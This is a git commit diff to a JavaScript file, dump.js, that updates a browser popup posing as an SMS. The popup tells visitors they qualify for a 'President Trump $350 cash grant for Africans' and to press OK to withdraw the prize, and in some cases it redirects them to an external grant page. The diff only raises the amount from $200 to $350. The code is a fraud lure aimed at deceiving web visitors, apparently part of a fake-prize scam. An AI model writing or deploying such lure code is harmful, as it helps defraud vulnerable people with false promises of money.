9b779111691373ed8f2c7a6e31f5208425bb3e41
boss-bloq <nsisboy01@gmail.com>
2024-11-09 05:50:24 -0800

    Update dump.js

--- dump.js
+++ dump.js
@@ -1,6 +1,6 @@
 
-var password = 'WITHDRAW $200'
-password=prompt('SMS: Congratulations You are qualify for President Trump $200 CASH GRANT FOR AFRICANS, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW $200');
-if (password != 'WITHDRAW $200') {
+var password = 'WITHDRAW $350'
+password=prompt('SMS: Congratulations You are qualify for President Trump $350 CASH GRANT FOR AFRICANS, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW $350');
+if (password != 'WITHDRAW $350') {
 location.href='https://damba-fest.org/200dollar-grant.html';
 }
